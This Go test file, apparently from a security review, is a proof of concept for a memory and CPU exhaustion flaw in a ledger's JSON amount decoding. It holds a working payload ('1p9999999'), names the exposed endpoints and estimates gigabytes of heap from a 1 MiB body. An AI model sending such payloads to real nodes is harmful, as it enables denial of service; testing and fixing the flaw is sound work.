package ledger

import (
	"encoding/json"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/signing"
)

// PoC (ledger-transition review): ledger amounts are *big.Rat decoded by encoding/json, which calls
// Rat.SetString — and that accepts exponent notation ("1e1000000", or binary "1p9999999" = 2^9999999,
// 11 bytes). The MaxMessageBytes cap is measured by RE-SERIALIZING the message (WithinMessageBound →
// json.Marshal → decimal conversion), and signatures/PaymentIDs RatString the amount first, so an
// 11-byte field costs ~1.25 MB of heap at decode and seconds of CPU per RatString/Marshal before any
// bound rejects it. A 1 MiB body (the only bound on /hdls/proposal, /hdls/pay, /hdls/payment, and on
// a served checkpoint) holds tens of thousands of such fields. This test decodes a SMALL batch (40)
// and reports heap per field, then times VerifyPayment and WithinMessageBound on one validly-signed
// payment; it FAILS if one decoded amount field costs more than 1000x its JSON size in heap.
func TestPoCRatDecodeAmplification(t *testing.T) {
	const n = 40
	var b strings.Builder
	b.WriteString("[")
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`{"Amount":"1p9999999"}`)
	}
	b.WriteString("]")
	body := b.String()

	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	start := time.Now()
	var payments []Payment
	if err := json.Unmarshal([]byte(body), &payments); err != nil {
		t.Fatal(err)
	}
	decodeDur := time.Since(start)
	runtime.ReadMemStats(&after)
	live := after.HeapAlloc - before.HeapAlloc
	perField := live / n
	t.Logf("decoded %d amount fields from %d bytes of JSON in %v; live heap +%d MB (%d KB per 22-byte field)",
		n, len(body), decodeDur.Round(time.Millisecond), live>>20, perField>>10)
	t.Logf("extrapolated to a 1 MiB body (~%d fields): ~%d GB of heap", (1<<20)/23, uint64((1<<20)/23)*perField>>30)

	// One validly-signed payment carrying such an amount: what each intake step costs before refusal.
	scheme, network := signing.Ed25519{}, "testnet"
	s, _ := signing.Generate(scheme, network)
	p := Payment{PublicKeyFrom: s.PublicKeyBase64(), PublicKeyTo: "someone", Amount: payments[0].Amount, BlockID: 10}
	signStart := time.Now()
	p, _ = SignPayment(s, p) // the sender pays this once and can replay the bytes
	t.Logf("sender's one-off signing cost: %v", time.Since(signStart).Round(time.Millisecond))
	start = time.Now()
	ok := VerifyPayment(scheme, network, p) // handler goroutine (handlePay / handleGossipPayment)
	verifyDur := time.Since(start)
	start = time.Now()
	within := WithinMessageBound(2000, p) // admitPayment, on the node's single event loop
	boundDur := time.Since(start)
	t.Logf("VerifyPayment=%v (valid=%v); WithinMessageBound=%v (within=%v) — the cap rejects only after the full cost",
		verifyDur.Round(time.Millisecond), ok, boundDur.Round(time.Millisecond), within)

	runtime.KeepAlive(payments)
	if perField > 1000*22 {
		t.Errorf("one 22-byte amount field decodes to %d KB of heap: the per-message cap is applied far too late to bound decode cost", perField>>10)
	}
}
